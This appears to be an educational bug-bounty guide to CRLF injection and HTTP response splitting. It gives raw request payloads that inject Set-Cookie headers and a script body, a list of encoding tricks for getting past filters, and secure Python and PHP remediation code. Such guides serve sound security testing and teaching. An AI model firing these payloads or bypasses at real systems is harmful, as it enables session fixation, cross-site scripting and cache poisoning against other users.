# 📁 CRLF Injection & HTTP Response Splitting — Security Testing Guide

*Contributed by Cyber_Spy.404 | Educational Bug Bounty Series*

> **Scope and ethics:** CRLF Injection can manipulate HTTP headers, plant arbitrary session cookies, or poison intermediate HTTP proxy caches. Test strictly against authorized targets. **Never poison public cache keys serving other users or inject malicious tracking cookies.** Use benign test cookies (e.g. `Set-Cookie: test_crlf=1`) to confirm vulnerability existence.

---

## 📌 Executive Summary

**CRLF Injection** occurs when an application takes user input and includes it in an outgoing HTTP response header (such as a redirect `Location` header or custom response headers) without stripping or encoding the Carriage Return (`\r` / `%0d`) and Line Feed (`\n` / `%0a`) character sequence.

Because the HTTP/1.1 protocol uses `CRLF` (`\r\n`) to denote the boundary between individual HTTP headers, and a double `CRLFCRLF` (`\r\n\r\n`) to separate headers from the response body, injecting these characters allows an attacker to:
1. **Inject Arbitrary Headers:** Plant attacker-controlled cookies via `Set-Cookie`.
2. **HTTP Response Splitting:** Terminate the header block and inject an arbitrary HTML/JavaScript response body, achieving Cross-Site Scripting (XSS).
3. **Web Cache Poisoning:** Force caching servers to store the attacker's fabricated response.

```
Incoming Request:
GET /redirect?url=http://example.com%0d%0aSet-Cookie:%20evil=1%0d%0a%0d%0a<h1>Injected</h1> HTTP/1.1

Constructed HTTP Response:
HTTP/1.1 302 Found
Location: http://example.com\r\n      <-- CRLF ends Location header
Set-Cookie: evil=1\r\n                <-- Injected Header!
\r\n                                  <-- Double CRLF ends headers!
<h1>Injected</h1>                     <-- Injected Response Body (XSS / Splitting)!
```

---

## 🔍 Core Discovery & Testing Methodology

### Step 1: Identify Header Reflection Endpoints
Look for parameters whose values are reflected in HTTP response headers:
- **Redirection Endpoints:** `/redirect?to=`, `/login?return_url=`, `/out?dest=`
- **Tracking / Locale Parameters:** `/?lang=`, `/?currency=`, `/?theme=`
- **Custom Header Injection:** APIs that set custom debugging or session headers based on user inputs.

---

### Step 2: Inject Safe Test Sequences

#### 1. Cookie Injection Probe (Safe PoC)
Test whether you can inject a harmless `Set-Cookie` header into the server response:
```http
GET /redirect?url=https://example.com%0d%0aSet-Cookie:%20cs_crlf_test=confirmed;%20Path=/ HTTP/1.1
Host: example.com
```

#### Verification Response (Vulnerable):
```http
HTTP/1.1 302 Found
Location: https://example.com
Set-Cookie: cs_crlf_test=confirmed; Path=/
Content-Length: 0
```
*Vulnerable Indicator:* The `Set-Cookie` header appears on its own distinct line in the HTTP response and is accepted by the browser.

---

#### 2. Response Splitting Probe (XSS via CRLF)
Test whether a double CRLF can force the server to render an injected response body:
```http
GET /redirect?url=https://example.com%0d%0a%0d%0a%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
Host: example.com
```

#### Verification Response (Vulnerable):
```http
HTTP/1.1 302 Found
Location: https://example.com

<script>alert(document.domain)</script>
```

---

## 💡 High-Value Bug Bounty Tips & Encoding Bypasses

When front-end proxies or simple filters block literal `%0d%0a`, test these encoding variations:

### 1. Alternate URL Encodings
- **Double URL Encoding:** `%250d%250a` or `%25250d%25250a`
- **Unicode / UTF-8 Overlong Encoding:**
  - `%c0%8d%c0%8a` (Overlong UTF-8 for CR/LF)
  - `%e0%80%8d%e0%80%8a`
- **Unicode Normalization Tricks:**
  - `%u000d%u000a`
  - `%E5%98%8A` (Certain IIS servers normalize to CRLF)

### 2. Single Character Variations
Sometimes applications filter `%0d%0a` (both together), but fail when injecting only one:
- Carriage Return only: `%0d`
- Line Feed only: `%0a`
- Prepending whitespace: `%0d%0a%20Set-Cookie:` or `%0d%0a%09Set-Cookie:`

---

## 🛡️ Mitigation & Remediation Guidelines

### 1. Strip Carriage Returns and Line Feeds
Sanitize all user input before passing it to header-setting functions:
```python
# Python / Flask (SECURE)
import re

def sanitize_header_value(value):
    # Strip all CR and LF characters
    return re.sub(r'[\r\n]', '', value)

@app.route('/redirect')
def safe_redirect():
    target = sanitize_header_value(request.args.get('url', '/'))
    response = redirect(target)
    return response
```

### 2. Rely on Modern Web Frameworks & Servers
Most modern web application servers and frameworks (Express 4+, Django, Spring Boot, ASP.NET Core) automatically reject or strip CRLF sequences in header APIs. If CRLF injection is present, it is often due to legacy custom PHP code (`header("Location: " . $url);`) or outdated web servers.

```php
// ❌ VULNERABLE in legacy PHP
header("Location: " . $_GET['url']);

// ✅ SECURE
$url = str_replace(array("\r", "\n"), '', $_GET['url']);
header("Location: " . filter_var($url, FILTER_SANITIZE_URL));
```

---

## 📊 CVSS 3.1 Severity Reference

- **CRLF Injection leading to Stored XSS / Cache Poisoning:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` (Score: **6.1 - Medium**)
- **HTTP Response Splitting with Session Fixation (`Set-Cookie`):** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` (Score: **8.1 - High**)
- **Basic Header Injection (No XSS or Cookie Control):** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N` (Score: **5.3 - Medium**)

---

## ✅ Bug Bounty Triage Checklist

- [ ] Target redirect or header parameter verified in scope.
- [ ] Confirmed that injected `Set-Cookie` appears as a distinct HTTP response header.
- [ ] Verified that browser DevTools records the injected cookie in the Application tab.
- [ ] Tested single `%0a`, double encoding `%250d%250a`, and Unicode variants.
- [ ] Included raw HTTP request and response headers in the report.
